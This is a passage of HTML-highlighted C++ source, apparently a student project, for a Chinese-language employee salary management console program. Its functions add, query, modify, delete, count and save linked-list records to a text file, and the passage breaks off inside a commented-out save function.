class="number">0</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">clear_buffer</span>();</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ide</span><span class="params">(<span class="type">int</span> Id)</span></span>&#123;</span><br><span class="line">	Linklist temp = head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (temp != <span class="literal">NULL</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(temp-&gt;e.<span class="built_in">getId</span>() == Id)</span><br><span class="line">		&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;该编号已存在！请重新输入：&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cin &gt;&gt; Id;</span><br><span class="line">		&#125;</span><br><span class="line">		temp = temp-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> choose;</span><br><span class="line">	Linklist current, newNode = <span class="keyword">new</span> Node;</span><br><span class="line">	newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#123;<span class="comment">//添加职工信息</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                ****人员类型****               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                1、经理                        ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                2、销售人员                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                3、销售经理                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                4、技术人员                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                0、返回主菜单                  ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字选择需要添加的人员类型:&quot;</span>;</span><br><span class="line">		choose = <span class="built_in">getchar</span>();</span><br><span class="line">		<span class="built_in">clear_buffer</span>();</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">		<span class="keyword">switch</span> (choose) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;<span class="comment">//添加经理</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addmanager</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;<span class="comment">//添加销售人员</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addsalesperson</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: &#123;<span class="comment">//添加销售经理</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addsalesmanager</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: &#123;<span class="comment">//添加技术人员</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addtechnician</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>: &#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;无效的选择！\n&quot;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			head-&gt;next = newNode;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			current = head-&gt;next;</span><br><span class="line">			<span class="keyword">while</span> (current-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				current = current-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			current-&gt;next = newNode;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">save</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> queryid;</span><br><span class="line">	string queryname;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">char</span> input = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖       ****公司员工工资信息查询系统****        ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖            请选择您的查询方式                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                1、编号查询                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                2、姓名查询                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                0、返回主菜单                  ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字选择查询的方式:&quot;</span>;</span><br><span class="line">	cin &gt;&gt; input;</span><br><span class="line">	<span class="built_in">clear_buffer</span>();</span><br><span class="line">	<span class="keyword">if</span> (input == <span class="string">&#x27;1&#x27;</span>) &#123;<span class="comment">//按编号查询</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入需要查询的员工编号:&quot;</span>;</span><br><span class="line">		cin &gt;&gt; queryid;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t========================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;编号&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;姓名&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;性别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;部门&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;级别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;工资&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getId</span>() == queryid) &#123;</span><br><span class="line">				current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			current = current-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t未能查询到该编号！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="string">&#x27;2&#x27;</span>) &#123;<span class="comment">//按姓名查询</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入需要查询的员工姓名:&quot;</span>;</span><br><span class="line">		cin &gt;&gt; queryname;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t========================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;编号&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;姓名&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;性别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;部门&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;级别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;工资&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getname</span>() == queryname) &#123;</span><br><span class="line">				current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">				flag = <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			current = current-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="literal">false</span>) &#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t未能查询到该员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t无效的选择！&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display_all</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t************员工信息展示************&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t==================================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;编号&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;姓名&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;性别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;部门&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;级别&quot;</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; <span class="string">&quot;工资&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t===========================================END=====================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> modifyid;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">char</span> item;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要修改的员工编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; modifyid;</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getId</span>() == modifyid) &#123;</span><br><span class="line">			current-&gt;e.<span class="built_in">showEmployees</span>();</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;请输入需要修改的项目的序号【1-姓名|2-性别|3-部门|4-级别|5-工资】:&quot;</span>;</span><br><span class="line">			cin &gt;&gt; item;</span><br><span class="line">			<span class="built_in">clear_buffer</span>();</span><br><span class="line">			<span class="keyword">switch</span> (item) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: current-&gt;e.<span class="built_in">modifyname</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:current-&gt;e.<span class="built_in">modifygender</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:current-&gt;e.<span class="built_in">modifydepartment</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:current-&gt;e.<span class="built_in">modifylevel</span>(); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:current-&gt;e.<span class="built_in">modifysalary</span>(); <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			flag = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">save</span>();</span><br><span class="line">	<span class="keyword">if</span> (flag == <span class="literal">false</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;未查找到该编号的员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	Linklist current_2 = head;</span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入需要删除的员工编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; id;</span><br><span class="line">	<span class="built_in">clear_buffer</span>();</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getId</span>() == id)</span><br><span class="line">		&#123;</span><br><span class="line">			current_2-&gt;next = current-&gt;next;</span><br><span class="line">			current = <span class="literal">NULL</span>;</span><br><span class="line">			cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;\t\t\t\t删除成功！&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">			flag = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		current_2 = current;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (flag == <span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;记录为空！\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">static_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> choose;</span><br><span class="line">	<span class="type">int</span> allnum = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> mnum = <span class="number">0</span>, spnum = <span class="number">0</span>, smnum = <span class="number">0</span>, tenum = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> bnum = <span class="number">0</span>, gnum = <span class="number">0</span>;</span><br><span class="line">	Linklist current = head-&gt;next, current_2 = head-&gt;next;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                ****统计方式****               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                1、统计所有员工数量             ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                2、统计各类员工数量             ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                3、统计员工性别                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                0、返回主菜单                  ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字选择统计的方式:&quot;</span>;</span><br><span class="line">	cin &gt;&gt; choose;</span><br><span class="line">	<span class="built_in">clear_buffer</span>();</span><br><span class="line">	<span class="keyword">if</span> (choose == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			allnum++;</span><br><span class="line">			current = current-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; allnum &lt;&lt; <span class="string">&quot;】员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (choose == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;经理&quot;</span>) &#123; mnum++;current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;销售人员&quot;</span>) &#123; spnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;销售经理&quot;</span>) &#123; smnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;技术人员&quot;</span>) &#123; tenum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; mnum &lt;&lt; <span class="string">&quot;】经理！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; spnum &lt;&lt; <span class="string">&quot;】销售人员！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; smnum &lt;&lt; <span class="string">&quot;】销售经理！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; tenum &lt;&lt; <span class="string">&quot;】技术人员！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (choose == <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;男&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;M&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;m&quot;</span>) &#123; bnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;女&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;F&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;f&quot;</span>) &#123; gnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; bnum &lt;&lt; <span class="string">&quot;】男员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; gnum &lt;&lt; <span class="string">&quot;】女员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (choose == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t无效的统计选择！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	ofstream outfile;</span><br><span class="line">	outfile.<span class="built_in">open</span>(<span class="string">&quot;employee.txt&quot;</span>, ios::trunc | ios::out);</span><br><span class="line">	<span class="keyword">if</span> (!outfile) &#123; <span class="comment">//打开失败</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;error opening source file.&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">listlength</span>();i++ ) &#123;</span><br><span class="line">		outfile &lt;&lt; current-&gt;e.<span class="built_in">getId</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; current-&gt;e.<span class="built_in">getname</span>() &lt;&lt; <span class="string">&quot; &quot;</span>&lt;&lt; current-&gt;e.<span class="built_in">getgender</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; current-&gt;e.<span class="built_in">getdepartment</span>() &lt;&lt; <span class="string">&quot; &quot;</span>&lt;&lt; current-&gt;e.<span class="built_in">getlevel</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; current-&gt;e.<span class="built_in">getsalary</span>() &lt;&lt; endl;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	outfile.<span class="built_in">close</span>();<span class="comment">/*循环结束后，关闭输出文件流 outfile*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">load</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Linklist current = <span class="keyword">new</span> Node;</span><br><span class="line">	current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	Linklist H = current;</span><br><span class="line">	Linklist p = H;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">	<span class="type">int</span> Id=<span class="literal">NULL</span>;</span><br><span class="line">	string Name;</span><br><span class="line">	string Gender;</span><br><span class="line">	string Department;</span><br><span class="line">	string Level;</span><br><span class="line">	<span class="type">double</span> salary;</span><br><span class="line">	<span class="function">ifstream <span class="title">infile</span><span class="params">(<span class="string">&quot;employee.txt&quot;</span>,ios::in )</span></span>;</span><br><span class="line">	<span class="keyword">if</span> (!infile) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;error opening source file.&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(infile &gt;&gt; Id&gt;&gt;Name &gt;&gt; Gender &gt;&gt; Department &gt;&gt; Level &gt;&gt; salary) </span><br><span class="line">	&#123;</span><br><span class="line">		flag =<span class="literal">false</span>;</span><br><span class="line">		current-&gt;e.<span class="built_in">saveid</span>(Id);</span><br><span class="line">		current-&gt;e.<span class="built_in">savename</span>(Name);</span><br><span class="line">		current-&gt;e.<span class="built_in">savegender</span>(Gender);</span><br><span class="line">		current-&gt;e.<span class="built_in">savedepartment</span>(Department);</span><br><span class="line">		current-&gt;e.<span class="built_in">savelevel</span>(Level);</span><br><span class="line">		current-&gt;e.<span class="built_in">savesalary</span>(salary);</span><br><span class="line">		p-&gt;next = current;</span><br><span class="line">		p = current;</span><br><span class="line">		Linklist newNode = <span class="keyword">new</span> Node;</span><br><span class="line">		newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		current-&gt;next = newNode;</span><br><span class="line">		current = newNode;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span> current;</span><br><span class="line">	p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (flag)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;文件为空！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	infile.<span class="built_in">close</span>();</span><br><span class="line">	head-&gt;next = H;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有误存储</span></span><br><span class="line"><span class="comment">//void save()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	ofstream f(&quot;employee.dat&quot;, ios::trunc | ios::out | ios::binary);</span></span><br><span class="line"><span class="comment">//	Linklist current = head-&gt;next;</span></span><br><span class="line"><span class="comment">//	if (!f)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		cerr &lt;&lt; &quot;open error!&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		abort();</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	while (current 